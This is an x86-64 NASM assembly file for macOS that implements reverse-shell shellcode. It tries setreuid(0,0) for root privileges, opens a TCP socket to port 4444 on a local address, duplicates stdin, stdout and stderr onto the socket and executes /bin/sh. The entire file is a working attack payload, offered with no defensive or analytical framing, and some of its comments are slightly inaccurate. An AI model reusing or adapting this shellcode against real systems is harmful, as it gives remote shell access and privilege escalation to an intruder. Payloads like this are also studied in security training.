BITS 64

section .text

global start

start:
  jmp runsh

start_shell:
    db '/bin/sh', 0

runsh:
  lea r14, [rel start_shell]  ; get address of shell

setreuid: ; set real and user id for maximum privileges
  xor rax, rax
  mov rax, 0x2000017          ; call setreuid
  xor rdi, rdi                ; real userid
  xor rsi, rsi                ; effective userid
  syscall                     ; setreuid(ruid, euid)

;socket
  mov rax, 0x2000061          ; call socket(AF_INET, SOCK_STREAM, 0)
  mov rdi, dword 2            ; AF_NET = 2
  mov rsi, dword 1            ; SOCK_STREAM = 1
;  mov dil, 2                  ; AF_NET = 2 to remove the trailing null
;  mov sil, 1                  ; SOCK_STREAM = 1
  xor rdx, rdx                ; protocol, set to 0
  syscall
  mov r12, rax                ; save socket from call

sock_addr:
  xor r8, r8                  ; clear the value of r8
  push r8                     ; push r8 to the stack as it's null (INADDR_ANY = 0)
;  push 0x0100007f             ; localhost ip, 127.0.0.1  if you want to fix the ip to localhost
  push WORD 0x5C11            ; push our port number to the stack (Port = 4444)
  push WORD 2                 ; push protocol argument to the stack (AF_INET = 2)
  mov r13, rsp                ; Save the sock_addr_in into r13
  
;connect
  mov rax, 0x2000062          ; connect(sockfd, sockaddr, addrleng);
  mov rdi, r12                ; sockfd from socket syscall
  mov rsi, r13                ; sockaddr 
  mov rdx, 0x10               ; addrleng the ip address length
  syscall
  mov rcx, rax                ; if successful->connected else exit
  jrcxz dup
  
exit:
  mov rax, 0x2000001          ; move the syscall for exit into rax
  xor rdi, rdi                ; return code (0)
  syscall                     ; execute
  xor r15, r15

dup:                          ; dup2 for stdin, stdout and stderr
  mov rax, 0x200005A          ; move the syscall for dup2 into rax
  mov rdi, r12                ; move the FD for the socket into rdi
  mov rsi, r15
  syscall                     ; call dup2(rdi, rsi)

  cmp r15, 2                  ; check to see if we are still under 2
  inc r15                     ; inc rsi
  jbe dup                     ; jmp if less than 2
 
;execve
  mov rax, 0x200003B          ; execve(char *fname, char **argp, char **envp);  
  mov rdi, r14                ; set the address to shell
  xor rsi, rsi                ; set argp to NULL
  xor rdx, rdx                ; set envp to NULL

run_cmd:  ; using as break point
  syscall


